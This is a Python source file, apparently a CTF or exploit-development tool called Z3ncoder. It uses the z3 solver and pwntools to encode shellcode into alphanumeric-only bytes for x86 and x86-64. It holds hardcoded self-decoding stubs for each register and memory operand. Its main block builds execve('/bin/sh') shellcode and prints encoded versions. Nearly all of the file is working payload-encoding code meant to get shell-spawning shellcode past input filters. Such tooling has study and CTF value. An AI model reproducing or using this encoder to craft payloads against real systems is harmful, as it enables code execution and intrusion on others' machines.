#!/usr/bin/env python3

__author__ = "zhouzq-thu"
__copyright__ = "Copyright © 2020 Zhi-Qiang Zhou"
__license__ = "Apache 2.0"
__all__ = [
    "Z3ncoder"
]

import re, string
from typing import Tuple, List, Iterable
try:
    import z3, pwn
except:
    pass

alnumset = (string.ascii_letters + string.digits).encode('utf-8')

def findXorMult(target: int) -> Tuple[int, int, int]:
    """
    Find byte, code (32 bit) and dword such that
        dword * byte == (target & 0xffffffff),
    where byte, code and (code ^ dword) are all alphanumeric.
    """
    intervals = [[ord('0'), ord('9')], [ord('A'), ord('Z')], [ord('a'), ord('z')]]
    isinset = lambda ch: z3.Or(*[z3.And(l <= ch, ch <= h) for (l, h) in intervals])

    v = [z3.BitVec(f'v_{i}', 32) for i in range(3)]
    byte, code, dword = v
    s = z3.Solver()
    s.add(byte & 0xFFFFFF00 == 0)
    code_xor_dword = code ^ dword
    s.add((dword * byte) & 0xFFFFFFFF == (target & 0xffffffff))
    s.add(isinset(byte & 0xFF))
    s.add(isinset(code & 0xFF))
    s.add(isinset((code >>  8) & 0xFF))
    s.add(isinset((code >> 16) & 0xFF))
    s.add(isinset((code >> 24) & 0xFF))
    s.add(isinset(code_xor_dword & 0xFF))
    s.add(isinset((code_xor_dword >>  8) & 0xFF))
    s.add(isinset((code_xor_dword >> 16) & 0xFF))
    s.add(isinset((code_xor_dword >> 24) & 0xFF))
    if s.check() == z3.unsat:
        return None, None, None
    m = s.model()
    byte, code, dword = m[v[0]].as_long(), m[v[1]].as_long(), m[v[2]].as_long()
    return byte, code, dword

def bx_IMUL_30_XOR_by(value: int, charset: Iterable) -> List[int]:
    for bx in charset:
        bx_IMUL_30 = (bx * 0x30) & 0xFF
        for by in charset:
            bx_IMUL_30_XOR_by = bx_IMUL_30 ^ by
            if bx_IMUL_30_XOR_by == value:
                return [bx, by]

def setEdi(value: int, clobber: str = 'eax') -> str:
    byte, code, dword = findXorMult(value)
    return f"""
        push    {hex(code ^ dword)}
        push    esp
        pop     ecx
        xor     [ecx], edi                  /* [ecx] <- (code ^ dword) ^ esi */
        xor     edi, [ecx]                  /* edi <- edi ^ [ecx] = (code ^ dword) */
        pop     {clobber}                         /* {clobber} <- (code ^ dword) */
        push    {hex(code)}
        xor     [ecx], edi                  /* [ecx] <- (code ^ dword) ^ code = dword */
        imul    edi, [ecx], {hex(byte)}
        pop     {clobber}                         /* {clobber} <- code */
        """

def setRdi(value: int, clobber: str = 'rax') -> str:
    byte, code, dword = findXorMult(value)
    return f"""
        push    {hex(code ^ dword)}
        push    rsp
        pop     rcx
        xor     [rcx], esi                  /* [rcx] <- (code ^ dword) ^ esi */
        xor     esi, [rcx]                  /* esi <- esi ^ [rcx] = (code ^ dword) */
        pop     {clobber}                         /* {clobber} <- (code ^ dword) */
        push    {hex(code)}
        xor     [rcx], esi                  /* [rcx] <- (code ^ dword) * byte = dword */
        imul    esi, [rcx], {hex(byte)}
        pop     {clobber}                         /* {clobber} <- code */
        push    rsi
        movsxd  rdi, [rcx]
        pop     {clobber}
        """

class Z3ncoder():

    def __init__(self):
        self._charset: bytes = alnumset

    def _gen_decoder(self, start: str) -> bytes:
        start = start.replace(' ', '').lower()
        pattern = re.compile(r"\[([^+-]*)\s*([+-]*\s*[0-9a-fA-Fx].*)*\]")
        result = pattern.match(start)
        if result is None:
            return {
                # x86_32
                'eax': b'PYhffffk4diXFkDqm02Dqn0D1DuEE',
                'ecx': b'hffffk4diXFkDqk02Dql0D1BuEE',
                'edx': b'hffffk4diXFkDrk02Drl0D2BuEE',
                'ebx': b'hwwwwk4dZXFkDsk02Dsl0D3BuEE',
                'esp': b'hZZZZk4dwXFkDtk02Dtl0D4BuEE',
                'ebp': b'hZZZZk4dwXFkDuk02Dul0D5BuEE',
                'esi': b'VYhZZZZk4dwXFkDqm02Dqn0D1DuEE',
                'edi': b'hiiiik4dfXFkDwk02Dwl0D7BuEE',
                # x86_64
                'rax': b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M',
                'rcx': b'Qh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M',
                'rdx': b'Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M',
                'rbx': b'Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M',
                'rsp': b'Th0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M',
                'rbp': b'Uh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M',
                'rsi': b'Vh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M',
                'rdi': b'Wh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M',
                'r8':  b'APh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqJHf9kDqX02DqY0D1Iu3M',
                'r9':  b'AQh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqJHf9kDqX02DqY0D1Iu3M',
                'r10': b'ARh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqJHf9kDqX02DqY0D1Iu3M',
                'r11': b'ASh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqJHf9kDqX02DqY0D1Iu3M',
                'r12': b'ATh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqJHf9kDqX02DqY0D1Iu3M',
                'r13': b'AUh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqJHf9kDqX02DqY0D1Iu3M',
                'r14': b'AVh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqJHf9kDqX02DqY0D1Iu3M',
                'r15': b'AWh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqJHf9kDqX02DqY0D1Iu3M'
            }[start]
        register, offset = result.groups()
        offset = 0 if offset is None else int(offset, base=0)
        if offset == 0:
            return {
                # x86_32
                '[eax]': b'1030VYhZZZZk4dwXFkDqq02Dqr0D1HuEE',
                '[ecx]': b'1131VYhffffk4diXFkDqq02Dqr0D1HuEE',
                '[edx]': b'1232VYhiiiik4dfXFkDqq02Dqr0D1HuEE',
                '[ebx]': b'1333VYhiiiik4dfXFkDqq02Dqr0D1HuEE',
                '[esp]': b'14d34dVYhZZZZk4dwXFkDqs02Dqt0D1JuEE',
                '[ebp]': b'UY1131VYhiiiik4dfXFkDqs02Dqt0D1JuEE',
                '[esi]': b'1636VYhiiiik4dfXFkDqq02Dqr0D1HuEE',
                '[edi]': b'1737VYhZZZZk4dwXFkDqq02Dqr0D1HuEE',
                # x86_64
                '[rax]': b'H10H30Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Lu3M',
                '[rcx]': b'H11H31Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Lu3M',
                '[rdx]': b'H12H32Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Lu3M',
                '[rbx]': b'H13H33Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Lu3M',
                '[rsp]': b'H14dH34dVh0666TY1131Xh333311k13XjjV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Mu3M',
                '[rbp]': b'UYH11H31Vh0666TY1131Xh333311k13XjjV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Mu3M',
                '[rsi]': b'H16H36Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Lu3M',
                '[rdi]': b'H17H37Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Lu3M',
                '[r8]':  b'I10I30Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Lu3M',
                '[r9]':  b'I11I31Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Lu3M',
                '[r10]': b'I12I32Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Lu3M',
                '[r11]': b'I13I33Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Lu3M',
                '[r12]': b'I14dI34dVh0666TY1131Xh333311k13XjjV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Mu3M',
                '[r13]': b'AUYH11H31Vh0666TY1131Xh333311k13XjmV11Hc1ZXYf1TqJHf9kDqX02DqY0D1Mu3M',
                '[r14]': b'I16I36Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Lu3M',
                '[r15]': b'I17I37Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqKHf9kDqY02DqZ0D1Lu3M',
            }[f"[{register}]"]
        else:
            if register[0] == 'e':
                set_value = pwn.asm(f"push {register}\n{setEdi(offset, clobber='eax')}", arch='i386', bits=32)
            elif register[0] == 'r':
                set_value = pwn.asm(f"push {register}\n{setRdi(offset, clobber='rax')}", arch='amd64', bits=64)
            else:
                raise ValueError
            return set_value + {
                # x86_32
                '[eax+offset]': b'X148348VYhDDDDk4dxXFkDqx02Dqy0D1YuEE',
                '[ecx+offset]': b'X148348VYhxxx8k4dDXFkDqx02Dqy0D1YuEE',
                '[edx+offset]': b'X148348VYhxxxxk4dDXFkDqx02Dqy0D1YuEE',
                '[ebx+offset]': b'X148348VYhxxxxk4dDXFkDqx02Dqy0D1YuEE',
                '[esp+offset]': b'X148348VYhDDDDk4dxXFkDqx02Dqy0D1YuEE',
                '[ebp+offset]': b'X148348VYhPPPPk4dfXFkDqx02Dqy0D1YuEE',
                '[esi+offset]': b'X148348VYhfff6k4dPXFkDqx02Dqy0D1YuEE',
                '[edi+offset]': b'X148348VYhDDDdk4dxXFkDqx02Dqy0D1YuEE',
                # x86_64
                '[rax+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqkHf9kDqy02Dqz0D1lu3M',
                '[rcx+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqkHf9kDqy02Dqz0D1lu3M',
                '[rdx+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqkHf9kDqy02Dqz0D1lu3M',
                '[rbx+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqkHf9kDqy02Dqz0D1lu3M',
                '[rsp+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqkHf9kDqy02Dqz0D1lu3M',
                '[rbp+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqkHf9kDqy02Dqz0D1lu3M',
                '[rsi+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqkHf9kDqy02Dqz0D1lu3M',
                '[rdi+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjkV11Hc1ZXYf1TqkHf9kDqy02Dqz0D1lu3M',
                '[r8+offset]':  b'XH148H348Vh0666TY1131Xh333311k13XjjV11Hc1ZXYf1TqjHf9kDqx02Dqy0D1lu3M',
                '[r9+offset]':  b'XH148H348Vh0666TY1131Xh333311k13XjjV11Hc1ZXYf1TqjHf9kDqx02Dqy0D1lu3M',
                '[r10+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjjV11Hc1ZXYf1TqjHf9kDqx02Dqy0D1lu3M',
                '[r11+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjjV11Hc1ZXYf1TqjHf9kDqx02Dqy0D1lu3M',
                '[r12+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjjV11Hc1ZXYf1TqjHf9kDqx02Dqy0D1lu3M',
                '[r13+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjjV11Hc1ZXYf1TqjHf9kDqx02Dqy0D1lu3M',
                '[r14+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjjV11Hc1ZXYf1TqjHf9kDqx02Dqy0D1lu3M',
                '[r15+offset]': b'XH148H348Vh0666TY1131Xh333311k13XjjV11Hc1ZXYf1TqjHf9kDqx02Dqy0D1lu3M'
            }[f"[{register}+offset]"]

    def isinset(self, ch: int or bytes) -> bool:
        if isinstance(ch, int):
            return (0 <= ch <= 255) and (ch in self._charset)
        else:
            return all(c in self._charset for c in ch)

    def encode(self, shellcode: bytes, start: str = 'rax'):
        decoder = self._gen_decoder(start)
        assert shellcode.find(b"\0") == -1, "Shellcode must be NULL free"
        shellcode += b'\0'
        decoder, encoded_data = decoder[:-2], decoder[-2:]
        destination_index = 1
        for byte in shellcode:
            pre_xor_byte = encoded_data[destination_index]
            encoded_data += bytes(bx_IMUL_30_XOR_by(byte ^ pre_xor_byte, self._charset))
            destination_index += 1
        encoded_shellcode = decoder + encoded_data
        assert self.isinset(encoded_shellcode)
        return encoded_shellcode

if __name__ == '__main__':
    encoder = Z3ncoder()

    print('i386 examples execve("/bin/sh", NULL, NULL):')
    pwn.context.arch = 'i386'
    pwn.context.bits = 32
    shellcode = pwn.asm(pwn.shellcraft.sh())
    for start in ['eax', '[eax]', '[ebp]', '[ebp-0x10]', '[esp]', '[esp+0x4]']:
        alnumsc = encoder.encode(shellcode, start)
        print('%s:\n%s\n' % (start, alnumsc.decode('utf-8')))

    print('amd64 examples execve("/bin/sh", NULL, NULL):')
    pwn.context.arch = 'amd64'
    pwn.context.bits = 64
    shellcode = pwn.asm(pwn.shellcraft.sh())
    for start in ['rax', '[rax]', '[rbp]', '[rbp-0x10]', '[rsp]', '[rsp+0x8]']:
        alnumsc = encoder.encode(shellcode, start)
        print('%s:\n%s\n' % (start, alnumsc.decode('utf-8')))
